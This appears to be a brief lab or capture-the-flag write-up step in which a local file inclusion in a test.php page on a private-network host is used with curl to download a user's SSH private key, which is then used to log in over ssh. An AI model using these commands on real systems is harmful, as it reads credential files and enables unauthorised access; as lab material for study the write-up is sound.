# LFI ssh_key
```zsh
curl 'http://192.168.11.21/test.php?file=/home/qiu/.ssh/id_rsa' -o qiu_rsa
```
![](../../../../assets/images/Pasted%20image%2020260503173243.png)

```zsh
ssh -i qiu_rsa qiu@192.168.11.21
```
![](../../../../assets/images/Pasted%20image%2020260503173317.png)